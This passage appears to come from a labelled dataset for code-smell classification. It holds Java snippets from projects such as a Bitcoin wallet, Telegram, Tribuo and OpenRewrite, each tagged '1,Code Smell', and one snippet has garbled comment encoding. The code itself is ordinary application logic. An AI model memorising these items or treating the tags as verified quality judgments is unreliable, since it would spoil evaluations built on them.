    @Override public J visitFieldAccess(    J.FieldAccess fieldAccess,    ExecutionContext ctx){
      J.FieldAccess fa=(J.FieldAccess)super.visitFieldAccess(fieldAccess,ctx);
      JavaType.FullyQualified type=TypeUtils.asFullyQualified(fa.getTarget().getType());
      if (typeMatches(Boolean.TRUE.equals(checkAssignability),fullyQualifiedType,type) && fa.getName().getSimpleName().equals(""class"")) {
        return SearchResult.found(fa);
      }
      return fa;
    }
  }
);
}
",1,Code Smell
"/** 
 * upload dirty data metrics and write dirty data
 * @param databaseName database name
 * @param tableName table name
 * @param recordNum record num
 * @param recordSize record byte size
 * @param data raw data
 * @param jsonFormat json formatter for formatting raw data
 * @param e exception
 */
private void handleDirtyData(String databaseName,String tableName,int recordNum,int recordSize,JsonNode data,JsonDynamicSchemaFormat jsonFormat,Exception e){
  if (null != metricData) {
    if (sinkMultipleEnable) {
      metricData.outputDirtyMetrics(databaseName,tableName,recordNum,recordSize);
    }
 else {
      metricData.invokeDirty(recordNum,recordSize);
    }
  }
  if (!dirtyOptions.ignoreDirty()) {
    return;
  }
  if (data == null || jsonFormat == null) {
    return;
  }
  Triple<String,String,String> triple=getDirtyLabelTagAndIdentity(data,jsonFormat);
  String label=triple.getLeft();
  String tag=triple.getMiddle();
  String identify=triple.getRight();
  if (label == null || tag == null || identify == null) {
    LOG.warn(""dirty label or tag or identify is null, ignore dirty data writing"");
    return;
  }
  DirtySinkHelper<Object> dirtySinkHelper=new DirtySinkHelper<>(dirtyOptions,dirtySink);
  List<Map<String,Object>> physicalDataList=HiveTableUtil.jsonNode2Map(jsonFormat.getPhysicalData(data));
  for (  Map<String,Object> record : physicalDataList) {
    JsonNode jsonNode=HiveTableUtil.object2JsonNode(record);
    dirtySinkHelper.invoke(jsonNode,DirtyType.BATCH_LOAD_ERROR,label,tag,identify,e);
  }
}",1,Code Smell
"protected void addAccount(Wallet masterWallet,StandardAccount standardAccount,Runnable postAddition){
  if (masterWallet.isEncrypted()) {
    String walletId=getWalletForm().getWalletId();
    TextInputDialogBuilder builder=new TextInputDialogBuilder().setTitle(""Wallet Password"");
    builder.setDescription(""Enter the wallet password:"");
    builder.setPasswordInput(true);
    String password=builder.build().showDialog(SparrowTerminal.get().getGui());
    if (password != null) {
      Platform.runLater(() -> {
        Storage.KeyDerivationService keyDerivationService=new Storage.KeyDerivationService(getWalletForm().getStorage(),new SecureString(password),true);
        keyDerivationService.setOnSucceeded(workerStateEvent -> {
          EventManager.get().post(new StorageEvent(walletId,TimedEvent.Action.END,""Done""));
          ECKey encryptionFullKey=keyDerivationService.getValue();
          Key key=new Key(encryptionFullKey.getPrivKeyBytes(),getWalletForm().getStorage().getKeyDeriver().getSalt(),EncryptionType.Deriver.ARGON2);
          encryptionFullKey.clear();
          masterWallet.decrypt(key);
          addAndEncryptAccount(masterWallet,standardAccount,key);
          if (postAddition != null) {
            postAddition.run();
          }
        }
);
        keyDerivationService.setOnFailed(workerStateEvent -> {
          EventManager.get().post(new StorageEvent(walletId,TimedEvent.Action.END,""Failed""));
          if (keyDerivationService.getException() instanceof InvalidPasswordException) {
            showErrorDialog(""Invalid Password"",""The wallet password was invalid."");
          }
 else {
            log.error(""Error deriving wallet key"",keyDerivationService.getException());
          }
        }
);
        EventManager.get().post(new StorageEvent(walletId,TimedEvent.Action.START,""Decrypting wallet...""));
        keyDerivationService.start();
      }
);
    }
  }
 else {
    Platform.runLater(() -> {
      addAndSaveAccount(masterWallet,standardAccount,null);
      if (postAddition != null) {
        postAddition.run();
      }
    }
);
  }
}",1,Code Smell
"/** 
 * Runs a comparison between an onnx model and a Tribuo model. <p> Only runs on x86 platforms.
 * @param model The Tribuo model.
 * @param onnxFile The path on disk to the ONNX model.
 * @param testSet The test set.
 * @param delta The delta allowable between the Tribuo and ORT predictions.
 * @throws OrtException If ORT failed to initialize.
 */
public static void onnxMultiLabelComparison(Model<MultiLabel> model,Path onnxFile,Dataset<MultiLabel> testSet,double delta) throws OrtException {
  Map<String,Integer> featureMapping=new HashMap<>();
  for (  VariableInfo f : model.getFeatureIDMap()) {
    VariableIDInfo id=(VariableIDInfo)f;
    featureMapping.put(id.getName(),id.getID());
  }
  Map<MultiLabel,Integer> outputMapping=new HashMap<>();
  for (  Pair<Integer,MultiLabel> l : model.getOutputIDInfo()) {
    outputMapping.put(l.getB(),l.getA());
  }
  String arch=System.getProperty(""os.arch"");
  String os=System.getProperty(""os.name"").toLowerCase(Locale.ENGLISH);
  if (arch.equalsIgnoreCase(""amd64"") || arch.equalsIgnoreCase(""x86_64"") || (arch.equalsIgnoreCase(""aarch64"") && (os.contains(""mac"") || os.contains(""nux"")))) {
    OrtEnvironment env=OrtEnvironment.getEnvironment();
    env.close();
    ONNXExternalModel<MultiLabel> onnxModel=ONNXExternalModel.createOnnxModel(new MultiLabelFactory(),featureMapping,outputMapping,new DenseTransformer(),new MultiLabelTransformer(),new OrtSession.SessionOptions(),onnxFile,""input"");
    List<Prediction<MultiLabel>> nativePredictions=model.predict(testSet);
    List<Prediction<MultiLabel>> onnxPredictions=onnxModel.predict(testSet);
    for (int i=0; i < nativePredictions.size(); i++) {
      Prediction<MultiLabel> tribuo=nativePredictions.get(i);
      Prediction<MultiLabel> external=onnxPredictions.get(i);
      assertEquals(tribuo.getOutput().getLabelSet(),external.getOutput().getLabelSet());
      for (      Map.Entry<String,MultiLabel> l : tribuo.getOutputScores().entrySet()) {
        MultiLabel other=external.getOutputScores().get(l.getKey());
        if (other == null) {
          fail(""Failed to find label "" + l.getKey() + "" in ORT prediction."");
        }
 else {
          assertEquals(l.getValue().getScore(),other.getScore(),delta);
        }
      }
    }
    ModelProvenance modelProv=model.getProvenance();
    Optional<ModelProvenance> optProv=onnxModel.getTribuoProvenance();
    assertTrue(optProv.isPresent());
    ModelProvenance onnxProv=optProv.get();
    assertNotSame(onnxProv,modelProv);
    assertEquals(modelProv,onnxProv);
    onnxModel.close();
  }
 else {
    logger.warning(""ORT based tests only supported on x86_64, found "" + arch);
  }
}",1,Code Smell
"private static TerminalColor getColor256(ControlSequence args,int index){
  int code=args.getArg(index + 1,0);
  if (code == 2) {
    int val0=args.getArg(index + 2,-1);
    int val1=args.getArg(index + 3,-1);
    int val2=args.getArg(index + 4,-1);
    if ((val0 >= 0 && val0 < 256) && (val1 >= 0 && val1 < 256) && (val2 >= 0 && val2 < 256)) {
      return new TerminalColor(val0,val1,val2);
    }
 else {
      LOG.error(""Bogus color setting "" + args.toString());
      return null;
    }
  }
 else   if (code == 5) {
    return ColorPalette.getIndexedColor(args.getArg(index + 2,0));
  }
 else {
    LOG.error(""Unsupported code for color attribute "" + args.toString());
    return null;
  }
}",1,Code Smell
"@Override public TreeVisitor<?,ExecutionContext> getVisitor(){
  JsonPathMatcher matcher=new JsonPathMatcher(keyPath);
  return new YamlIsoVisitor<ExecutionContext>(){
    @Override public Yaml.Mapping.Entry visitMappingEntry(    Yaml.Mapping.Entry entry,    ExecutionContext ctx){
      Yaml.Mapping.Entry e=super.visitMappingEntry(entry,ctx);
      if (matcher.matches(getCursor()) && (!(e.getValue() instanceof Yaml.Scalar) || !((Yaml.Scalar)e.getValue()).getValue().equals(value))) {
        Yaml.Anchor anchor=(e.getValue() instanceof Yaml.Scalar) ? ((Yaml.Scalar)e.getValue()).getAnchor() : null;
        String prefix=e.getValue() instanceof Yaml.Sequence ? ((Yaml.Sequence)e.getValue()).getOpeningBracketPrefix() : e.getValue().getPrefix();
        e=e.withValue(new Yaml.Scalar(randomId(),prefix,Markers.EMPTY,Yaml.Scalar.Style.PLAIN,anchor,value));
      }
      return e;
    }
    @Override public Yaml.Scalar visitScalar(    Yaml.Scalar scalar,    ExecutionContext ctx){
      Yaml.Scalar s=super.visitScalar(scalar,ctx);
      if (matcher.matches(getCursor())) {
        s=s.withValue(value);
      }
      return s;
    }
  }
;
}
",1,Code Smell
"/** 
 * Attempt to find a  {@link Field field} on the supplied {@link Class} with thesupplied  {@code name}. Searches all superclasses up to  {@link Object}.
 * @param clazz the class to introspect
 * @param name  the name of the field
 * @return the corresponding Field object, or {@code null} if not found
 */
public static Field findField(Class<?> clazz,String name){
  return findField(clazz,name,null);
}
/** 
 * Attempt to find a  {@link Field field} on the supplied {@link Class} with thesupplied  {@code name} and/or {@link Class type}. Searches all superclasses up to  {@link Object}.
 * @param clazz the class to introspect
 * @param name  the name of the field (may be {@code null} if type is specified)
 * @param type  the type of the field (may be {@code null} if name is specified)
 * @return the corresponding Field object, or {@code null} if not found
 */
public static Field findField(Class<?> clazz,String name,Class<?> type){
  Assert.notNull(clazz,""Class must not be null"");
  Assert.isTrue(name != null || type != null,""Either name or type of the field must be specified"");
  Class<?> searchType=clazz;
  while (!Object.class.equals(searchType) && searchType != null) {
    Field[] fields=searchType.getDeclaredFields();
    for (    Field field : fields) {
      if ((name == null || name.equals(field.getName())) && (type == null || type.equals(field.getType()))) {
        return field;
      }
    }
    searchType=searchType.getSuperclass();
  }
  return null;
}
",1,Code Smell
"/** 
 * 鑾峰彇璺敱鍦板潃
 * @param menu 鑿滃崟淇℃伅
 * @return 璺敱鍦板潃
 */
public String getRouterPath(SysMenuEntity menu){
  String routerPath=menu.getPath();
  if (menu.getParentId().intValue() != 0 && isInnerLink(menu)) {
    routerPath=innerLinkReplaceEach(routerPath);
  }
  if (0 == menu.getParentId().intValue() && UserConstants.TYPE_DIR.equals(menu.getMenuType()) && UserConstants.NO_FRAME.equals(menu.getIsFrame())) {
    routerPath=""/"" + menu.getPath();
  }
 else   if (isMenuFrame(menu)) {
    routerPath=""/"";
  }
  return routerPath;
}",1,Code Smell
"public static String stringForMessageListDate(long date){
  try {
    date*=1000;
    if (Math.abs(System.currentTimeMillis() - date) >= 31536000000L) {
      return getInstance().formatterYear.format(new Date(date));
    }
 else {
      Calendar rightNow=Calendar.getInstance();
      int day=rightNow.get(Calendar.DAY_OF_YEAR);
      rightNow.setTimeInMillis(date);
      int dateDay=rightNow.get(Calendar.DAY_OF_YEAR);
      int dayDiff=dateDay - day;
      if (dayDiff == 0 || dayDiff == -1 && System.currentTimeMillis() - date < 60 * 60 * 8* 1000) {
        return getInstance().formatterDay.format(new Date(date));
      }
 else       if (dayDiff > -7 && dayDiff <= -1) {
        return getInstance().formatterWeek.format(new Date(date));
      }
 else       if (usePersianCalendar) {
        return new PersianDate(date).getPersianMonthDay();
      }
 else {
        return getInstance().formatterDayMonth.format(new Date(date));
      }
    }
  }
 catch (  Exception e) {
    FileLog.e(e);
  }
  return ""LOC_ERR"";
}",1,Code Smell
"void confirmPassword(Editable editable){
  if ((!TextUtils.isEmpty(authCodeEditText.getText()) || !TextUtils.isEmpty(resetCode)) && !TextUtils.isEmpty(newPasswordEditText.getText()) && !TextUtils.isEmpty(editable)) {
    confirmButton.setEnabled(true);
  }
 else {
    confirmButton.setEnabled(false);
  }
}
",1,Code Smell
"/** 
 * Checks for equality between two svm_models. <p> Equality is defined as bit-wise exact for SV, rho, sv_coeff, probA and probB.
 * @param first The first model.
 * @param second The second model.
 * @return True if the models are identical.
 */
public static boolean modelEquals(svm_model first,svm_model second){
  boolean svCoeffEquals=Arrays.deepEquals(first.sv_coef,second.sv_coef);
  boolean probAEquals=Arrays.equals(first.probA,second.probA);
  boolean probBEquals=Arrays.equals(first.probB,second.probB);
  boolean nSVEquals=Arrays.equals(first.nSV,second.nSV);
  boolean rhoEquals=Arrays.equals(first.rho,second.rho);
  boolean labelEquals=Arrays.equals(first.label,second.label);
  if (svCoeffEquals && probAEquals && probBEquals&& nSVEquals&& rhoEquals&& labelEquals) {
    try {
      for (int i=0; i < first.SV.length; i++) {
        for (int j=0; j < first.SV[i].length; j++) {
          svm_node firstNode=first.SV[i][j];
          svm_node secondNode=second.SV[i][j];
          if (firstNode.index != secondNode.index) {
            return false;
          }
 else           if (Double.compare(firstNode.value,secondNode.value) != 0) {
            return false;
          }
        }
      }
      return true;
    }
 catch (    NullPointerException e) {
      return false;
    }
  }
 else {
    return false;
  }
}",1,Code Smell
"private void updateEditorPadding(){
  if (!(editor instanceof JTextField))   return;
  JTextField textField=(JTextField)editor;
  Insets insets=textField.getInsets();
  Insets pad=padding;
  if (insets.top != 0 || insets.left != 0 || insets.bottom != 0 || insets.right != 0) {
    pad=new Insets(unscale(Math.max(scale(padding.top) - insets.top,0)),unscale(Math.max(scale(padding.left) - insets.left,0)),unscale(Math.max(scale(padding.bottom) - insets.bottom,0)),unscale(Math.max(scale(padding.right) - insets.right,0)));
  }
  textField.putClientProperty(TEXT_FIELD_PADDING,pad);
}",1,Code Smell
"public Dialog showDialog(Dialog dialog){
  return showDialog(dialog,false,null);
}
public Dialog showDialog(Dialog dialog,Dialog.OnDismissListener onDismissListener){
  return showDialog(dialog,false,onDismissListener);
}
public Dialog showDialog(Dialog dialog,boolean allowInTransition,final Dialog.OnDismissListener onDismissListener){
  if (dialog == null || parentLayout == null || parentLayout.isTransitionAnimationInProgress() || parentLayout.isSwipeInProgress() || !allowInTransition && parentLayout.checkTransitionAnimation()) {
    return null;
  }
  try {
    if (visibleDialog != null) {
      visibleDialog.dismiss();
      visibleDialog=null;
    }
  }
 catch (  Exception e) {
    FileLog.e(e);
  }
  try {
    visibleDialog=dialog;
    visibleDialog.setCanceledOnTouchOutside(true);
    visibleDialog.setOnDismissListener(dialog1 -> {
      if (onDismissListener != null) {
        onDismissListener.onDismiss(dialog1);
      }
      onDialogDismiss((Dialog)dialog1);
      if (dialog1 == visibleDialog) {
        visibleDialog=null;
      }
    }
);
    visibleDialog.show();
    return visibleDialog;
  }
 catch (  Exception e) {
    FileLog.e(e);
  }
  return null;
}",1,Code Smell
"@Override public void onTextChanged(EditText editText){
  String text=editText.getText().toString();
  if (text.length() != 0 || (searchViewPager.dialogsSearchAdapter != null && searchViewPager.dialogsSearchAdapter.hasRecentSearch()) || searchFiltersWasShowed) {
    searchWas=true;
    if (!searchIsShowed) {
      showSearch(true,false,true);
    }
  }
  searchViewPager.onTextChanged(text);
}
@Override public void onTextChanged(final CharSequence text,boolean bigChange){
}",1,Code Smell
"public LinkConstant getLinkConstant(int index){
  LinkConstant ln=(LinkConstant)getConstant(index);
  if (ln != null && interceptor != null && (ln.type == CodeConstants.CONSTANT_Fieldref || ln.type == CodeConstants.CONSTANT_Methodref || ln.type == CodeConstants.CONSTANT_InterfaceMethodref)) {
    String newClassName=buildNewClassname(ln.classname);
    String newElement=interceptor.getName(ln.classname + ' ' + ln.elementname+ ' '+ ln.descriptor);
    String newDescriptor=buildNewDescriptor(ln.type == CodeConstants.CONSTANT_Fieldref,ln.descriptor);
    if (newClassName != null || newElement != null || newDescriptor != null) {
      String className=newClassName == null ? ln.classname : newClassName;
      String elementName=newElement == null ? ln.elementname : newElement.split("" "")[1];
      String descriptor=newDescriptor == null ? ln.descriptor : newDescriptor;
      ln=new LinkConstant(ln.type,className,elementName,descriptor);
    }
  }
  return ln;
}",1,Code Smell
"/** 
 * Returns the parent Fragment containing this Fragment.
 * @throws IllegalStateException if this Fragment is attached directly to an Activity orother Fragment host.
 * @see #getParentFragment()
 */
@NonNull public final Fragment requireParentFragment(){
  Fragment parentFragment=getParentFragment();
  if (parentFragment == null) {
    Context context=getContext();
    if (context == null) {
      throw new IllegalStateException(""Fragment "" + this + "" is not attached to""+ "" any Fragment or host"");
    }
 else {
      throw new IllegalStateException(""Fragment "" + this + "" is not a child Fragment, it""+ "" is directly attached to ""+ getContext());
    }
  }
  return parentFragment;
}
",1,Code Smell
"/** 
 * 当我们调用mRecyclerView.addItemDecoration()方法添加decoration的时候，RecyclerView在绘制的时候，去会绘制decorator，即调用该类的onDraw和onDrawOver方法， 1.onDraw方法先于drawChildren 2.onDrawOver在drawChildren之后，一般我们选择复写其中一个即可。 3.getItemOffsets 可以通过outRect.set()为每个Item设置一定的偏移量，主要用于绘制Decorator。
 */
@Override public void onDraw(@NonNull Canvas canvas,@NonNull RecyclerView parent,@NonNull RecyclerView.State state){
  super.onDraw(canvas,parent,state);
  checkCache(parent);
  if (mAdapter == null || mStickyHeadContainer == null) {
    return;
  }
  calculateStickyHeadPosition(parent);
  if (mEnableStickyHead && mFirstVisiblePosition >= mStickyHeadPosition && mStickyHeadPosition != -1) {
    View belowView=parent.findChildViewUnder(canvas.getWidth() / 2F,mStickyHeadContainer.getChildHeight() + 0.01f);
    mStickyHeadContainer.onPositionChanged(mStickyHeadPosition);
    int topOffset=belowView != null ? belowView.getTop() : 0;
    int offset;
    if (isStickyHead(parent,belowView) && topOffset >= 0) {
      offset=topOffset - mStickyHeadContainer.getChildHeight();
    }
 else {
      offset=0;
    }
    if (mOnStickyChangedListener == null) {
      mStickyHeadContainer.onScrolling(offset);
    }
 else {
      mOnStickyChangedListener.onScrolling(offset);
    }
    if (!parent.canScrollVertically(1) && offset != 0) {
      if (mOnStickyChangedListener == null) {
        mStickyHeadContainer.onNotEnoughHighScroll();
      }
 else {
        mOnStickyChangedListener.onNotEnoughHighScroll();
      }
    }
  }
 else {
    if (mOnStickyChangedListener == null) {
      mStickyHeadContainer.onInVisible();
    }
 else {
      mOnStickyChangedListener.onInVisible();
    }
  }
}",1,Code Smell
"@SubscribeEvent @OnlyIn(Dist.CLIENT) public static void drawCustomBlockSelection(RenderHighlightEvent.Block event){
  Minecraft mc=Minecraft.getInstance();
  BlockHitResult target=event.getTarget();
  BlockPos pos=target.getBlockPos();
  BlockState blockstate=mc.level.getBlockState(pos);
  if (mc.player == null || mc.player.isSpectator())   return;
  if (!mc.level.getWorldBorder().isWithinBounds(pos))   return;
  if (!AllBlocks.CLIPBOARD.isIn(mc.player.getMainHandItem()))   return;
  if (!(mc.level.getBlockEntity(pos) instanceof SmartBlockEntity))   return;
  if (!smartBE.getAllBehaviours().stream().anyMatch(b -> b instanceof ClipboardCloneable && cc.writeToClipboard(new CompoundTag(),target.getDirection())) && !(smartBE instanceof ClipboardCloneable))   return;
  VoxelShape shape=blockstate.getShape(mc.level,pos);
  if (shape.isEmpty())   return;
  VertexConsumer vb=event.getMultiBufferSource().getBuffer(RenderType.lines());
  Vec3 camPos=event.getCamera().getPosition();
  PoseStack ms=event.getPoseStack();
  ms.pushPose();
  ms.translate(pos.getX() - camPos.x,pos.getY() - camPos.y,pos.getZ() - camPos.z);
  TrackBlockOutline.renderShape(shape,ms,vb,true);
  event.setCanceled(true);
  ms.popPose();
}",1,Code Smell
"private static String processClassLoaderString43OrLater(String input){
  int start=input.indexOf(""DexPathList"") + ""DexPathList"".length();
  if (input.length() > start + 4) {
    String trimmed=input.substring(start);
    int end=trimmed.indexOf(']');
    if (trimmed.charAt(0) == '[' && trimmed.charAt(1) == '[' && end >= 0) {
      trimmed=trimmed.substring(2,end);
      String split[]=trimmed.split("","");
      for (int i=0; i < split.length; i++) {
        int quoteStart=split[i].indexOf('""');
        int quoteEnd=split[i].lastIndexOf('""');
        if (quoteStart > 0 && quoteStart < quoteEnd) {
          split[i]=split[i].substring(quoteStart + 1,quoteEnd);
        }
      }
      StringBuilder sb=new StringBuilder();
      for (      String s : split) {
        if (sb.length() > 0) {
          sb.append(':');
        }
        sb.append(s);
      }
      return sb.toString();
    }
  }
  return input;
}",1,Code Smell
"@Override protected void onMeasure(int widthMeasureSpec,int heightMeasureSpec){
  ignoreLayout=true;
  int width=MeasureSpec.getSize(widthMeasureSpec);
  int height=MeasureSpec.getSize(heightMeasureSpec);
  setMeasuredDimension(width,height);
  float bitmapW;
  float bitmapH;
  int fullHeight=AndroidUtilities.displaySize.y - ActionBar.getCurrentActionBarHeight() - getAdditionalTop()- getAdditionalBottom();
  int maxHeight=fullHeight - AndroidUtilities.dp(48);
  if (bitmapToEdit != null) {
    bitmapW=bitmapToEdit.getWidth();
    bitmapH=bitmapToEdit.getHeight();
  }
 else {
    bitmapW=width;
    bitmapH=height - ActionBar.getCurrentActionBarHeight() - AndroidUtilities.dp(48);
  }
  float renderWidth=width;
  float renderHeight=(float)Math.floor(renderWidth * bitmapH / bitmapW);
  if (renderHeight > maxHeight) {
    renderHeight=maxHeight;
    renderWidth=(float)Math.floor(renderHeight * bitmapW / bitmapH);
  }
  renderView.measure(MeasureSpec.makeMeasureSpec((int)renderWidth,MeasureSpec.EXACTLY),MeasureSpec.makeMeasureSpec((int)renderHeight,MeasureSpec.EXACTLY));
  renderInputView.measure(MeasureSpec.makeMeasureSpec((int)renderWidth,MeasureSpec.EXACTLY),MeasureSpec.makeMeasureSpec((int)renderHeight,MeasureSpec.EXACTLY));
  baseScale=renderWidth / paintingSize.width;
  entitiesView.setScaleX(baseScale);
  entitiesView.setScaleY(baseScale);
  entitiesView.measure(MeasureSpec.makeMeasureSpec((int)paintingSize.width,MeasureSpec.EXACTLY),MeasureSpec.makeMeasureSpec((int)paintingSize.height,MeasureSpec.EXACTLY));
  if (currentEntityView != null) {
    currentEntityView.updateSelectionView();
  }
  selectionContainerView.measure(MeasureSpec.makeMeasureSpec((int)renderWidth,MeasureSpec.EXACTLY),MeasureSpec.makeMeasureSpec((int)renderHeight,MeasureSpec.EXACTLY));
  measureChild(bottomLayout,widthMeasureSpec,heightMeasureSpec);
  measureChild(weightChooserView,widthMeasureSpec,heightMeasureSpec);
  measureChild(pipetteContainerLayout,widthMeasureSpec,heightMeasureSpec);
  measureChild(overlayLayout,widthMeasureSpec,heightMeasureSpec);
  topLayout.setPadding(topLayout.getPaddingLeft(),AndroidUtilities.dp(12) + AndroidUtilities.statusBarHeight,topLayout.getPaddingRight(),topLayout.getPaddingBottom());
  measureChild(topLayout,widthMeasureSpec,heightMeasureSpec);
  ignoreLayout=false;
  int keyboardSize=0;
  if (!waitingForKeyboardOpen && keyboardSize <= AndroidUtilities.dp(20) && !emojiViewVisible && !isAnimatePopupClosing) {
    ignoreLayout=true;
    hideEmojiView();
    ignoreLayout=false;
  }
  if (keyboardSize <= AndroidUtilities.dp(20)) {
  }
 else {
    hideEmojiView();
  }
  if (emojiView != null) {
    measureChild(emojiView,widthMeasureSpec,heightMeasureSpec);
  }
}",1,Code Smell
"@CanIgnoreReturnValue @Override public Object postProcessAfterInitialization(Object bean,String beanName){
  if (bean instanceof DataSource && !isRoutingDatasource(bean) && !ScopedProxyUtils.isScopedTarget(beanName)) {
    DataSource dataSource=(DataSource)bean;
    return JdbcTelemetry.builder(openTelemetryProvider.getObject()).setStatementSanitizationEnabled(InstrumentationConfigUtil.isStatementSanitizationEnabled(configPropertiesProvider.getObject(),""otel.instrumentation.jdbc.statement-sanitizer.enabled"")).build().wrap(dataSource);
  }
  return bean;
}
",1,Code Smell
"public void autoQuitFullscreen(){
  if ((System.currentTimeMillis() - lastAutoFullscreenTime) > 2000 && state == STATE_PLAYING && screen == SCREEN_FULLSCREEN) {
    lastAutoFullscreenTime=System.currentTimeMillis();
    backPress();
  }
}",1,Code Smell
"@Override public List<ExternalAppInfo> requestAppInfo(ExternalResourceIdentifier identifier,ExternalResourceProvider provider){
  String rmWebAddress=getAndUpdateActiveRmWebAddress(provider);
  String queueName=((YarnResourceIdentifier)identifier).getQueueName();
  String realQueueName=""root."" + queueName;
  JsonNode resp=getResponseByUrl(""apps"",rmWebAddress,provider).path(""apps"").path(""app"");
  if (resp.isMissingNode()) {
    return new ArrayList<>();
  }
  ArrayNode appArray=(ArrayNode)resp;
  List<ExternalAppInfo> appInfoList=new ArrayList<>();
  Iterator<JsonNode> iterator=appArray.elements();
  while (iterator.hasNext()) {
    JsonNode app=iterator.next();
    String yarnQueueName=app.get(""queue"").asText();
    String state=app.get(""state"").asText();
    if (yarnQueueName.equals(realQueueName) && (state.equals(""RUNNING"") || state.equals(""ACCEPTED""))) {
      String id=app.get(""id"").asText();
      String user=app.get(""user"").asText();
      String applicationType=app.get(""applicationType"").asText();
      Optional<YarnResource> yarnResource=getAllocatedYarnResource(Optional.ofNullable(app),queueName);
      if (yarnResource.isPresent()) {
        YarnAppInfo appInfo=new YarnAppInfo(id,user,state,applicationType,yarnResource.get());
        appInfoList.add(appInfo);
      }
    }
  }
  return appInfoList;
}
",1,Code Smell
"synchronized public void reloadInstalledModules(){
  modulesLoaded=false;
  if (!ConfigManager.isBinderAlive()) {
    modulesLoaded=true;
    return;
  }
  Map<Pair<String,Integer>,InstalledModule> modules=new HashMap<>();
  var users=ConfigManager.getUsers();
  for (  PackageInfo pkg : ConfigManager.getInstalledPackagesFromAllUsers(PackageManager.GET_META_DATA | MATCH_ALL_FLAGS,false)) {
    ApplicationInfo app=pkg.applicationInfo;
    var modernApk=getModernModuleApk(app);
    if (modernApk != null || isLegacyModule(app)) {
      modules.computeIfAbsent(Pair.create(pkg.packageName,app.uid / App.PER_USER_RANGE),k -> new InstalledModule(pkg,modernApk));
    }
  }
  installedModules=modules;
  this.users=users;
  enabledModules=new HashSet<>(Arrays.asList(ConfigManager.getEnabledModules()));
  modulesLoaded=true;
  listeners.forEach(ModuleListener::onModulesReloaded);
}
",1,Code Smell
"@Override public boolean getValue(int index,TypedValue outValue){
  var id=getResourceId(index,0);
  Object replacement=((XResources)getResources()).getReplacement(id);
  if (replacement instanceof XResForwarder) {
    Resources repRes=((XResForwarder)replacement).getResources();
    int repId=((XResForwarder)replacement).getId();
    repRes.getValue(repId,outValue,true);
    return outValue.type != TypedValue.TYPE_NULL;
  }
 else {
    if (replacement != null) {
      XposedBridge.log(""Replacement of resource ID #0x"" + Integer.toHexString(id) + "" escaped because of deprecated replacement. Please use XResForwarder instead."");
    }
    return super.getValue(index,outValue);
  }
}",1,Code Smell
"@EventHandler private void onRender(Render3DEvent event){
  if (!(hitResult instanceof BlockHitResult) || !mc.world.getBlockState(blockHitResult.getBlockPos()).isReplaceable() || !(mc.player.getMainHandStack().getItem() instanceof BlockItem) && !(mc.player.getMainHandStack().getItem() instanceof SpawnEggItem) || !render.get())   return;
  event.renderer.box(blockHitResult.getBlockPos(),sideColor.get(),lineColor.get(),shapeMode.get(),0);
}",1,Code Smell
"private void invalidateTabletMode(){
  Boolean wasTablet=AndroidUtilities.getWasTablet();
  if (wasTablet == null) {
    return;
  }
  AndroidUtilities.resetWasTabletFlag();
  if (wasTablet != AndroidUtilities.isTablet()) {
    long dialogId=0;
    long topicId=0;
    if (wasTablet) {
      mainFragmentsStack.addAll(rightFragmentsStack);
      mainFragmentsStack.addAll(layerFragmentsStack);
      rightFragmentsStack.clear();
      layerFragmentsStack.clear();
    }
 else {
      List<BaseFragment> fragments=new ArrayList<>(mainFragmentsStack);
      mainFragmentsStack.clear();
      rightFragmentsStack.clear();
      layerFragmentsStack.clear();
      for (      BaseFragment fragment : fragments) {
        if (fragment instanceof DialogsActivity && ((DialogsActivity)fragment).isMainDialogList() && !((DialogsActivity)fragment).isArchive()) {
          mainFragmentsStack.add(fragment);
        }
 else         if (fragment instanceof ChatActivity && !((ChatActivity)fragment).isInScheduleMode()) {
          rightFragmentsStack.add(fragment);
          if (dialogId == 0) {
            dialogId=((ChatActivity)fragment).getDialogId();
            topicId=((ChatActivity)fragment).getTopicId();
          }
        }
 else {
          layerFragmentsStack.add(fragment);
        }
      }
    }
    setupActionBarLayout();
    actionBarLayout.rebuildFragments(INavigationLayout.REBUILD_FLAG_REBUILD_LAST);
    if (AndroidUtilities.isTablet()) {
      rightActionBarLayout.rebuildFragments(INavigationLayout.REBUILD_FLAG_REBUILD_LAST);
      layersActionBarLayout.rebuildFragments(INavigationLayout.REBUILD_FLAG_REBUILD_LAST);
      for (      BaseFragment fragment : mainFragmentsStack) {
        if (fragment instanceof DialogsActivity && ((DialogsActivity)fragment).isMainDialogList()) {
          ((DialogsActivity)fragment).setOpenedDialogId(dialogId,topicId);
        }
      }
    }
  }
}",1,Code Smell
"private void initData(){
  for (  UserLayoutEntity entity : mUserLayoutFactory.mLayoutEntityList) {
    if (null != entity && !TextUtils.isEmpty(entity.userId) && entity.userId.equals(TUILogin.getLoginUser())) {
      UserLayout layout=allocUserLayout(entity.userModel);
      if (layout == null) {
        continue;
      }
      boolean cameraOpen=TUICallingStatusManager.sharedInstance(mContext).isCameraOpen();
      layout.setVideoAvailable(cameraOpen);
      TUICallDefine.Status status=TUICallingStatusManager.sharedInstance(mContext).getCallStatus();
      if (!cameraOpen && !TUICallDefine.Status.Accept.equals(status)) {
        TUICommonDefine.Camera camera=TUICallingStatusManager.sharedInstance(mContext).getFrontCamera();
        mCallingAction.openCamera(camera,layout.getVideoView(),null);
      }
    }
  }
}
",1,Code Smell
"@Override public void didReceivedNotification(int id,int account,final Object... args){
  if (id == NotificationCenter.fileLoaded || id == NotificationCenter.fileLoadFailed) {
    if (stickers != null && !stickers.isEmpty() && !stickersToLoad.isEmpty() && visibleByStickersSearch) {
      String fileName=(String)args[0];
      stickersToLoad.remove(fileName);
      if (stickersToLoad.isEmpty()) {
        delegate.needChangePanelVisibility(getItemCountInternal() > 0);
      }
    }
  }
}",1,Code Smell
"/** 
 * 寻找匹配Method的方法
 * @param path
 * @param currentMethod
 * @return
 */
private Method findMethod(String path,Method currentMethod){
  for (  Class<?> klass : PackageScanLoader.controllerClazzes) {
    Controller preAnno=klass.getAnnotation(Controller.class);
    String pathPrefix=preAnno.path();
    for (    Method method : klass.getMethods()) {
      Controller controller=method.getAnnotation(Controller.class);
      if (controller != null && controller.specificPath().equals(path)) {
        currentMethod=method;
        break;
      }
      if (controller != null && (controller.specificPath().isEmpty() || !controller.path().isEmpty())) {
        String realPath=pathPrefix + controller.path();
        if (controller.matchAll()) {
          if (realPath.equals(path)) {
            currentMethod=method;
            break;
          }
        }
 else {
          if (path != null && path.startsWith(realPath)) {
            currentMethod=method;
            break;
          }
        }
      }
    }
  }
  return currentMethod;
}
",1,Code Smell
"private void showFloatingWindow(AVEngineKit.CallSession session){
  if (wm != null) {
    return;
  }
  session.restVideoViews();
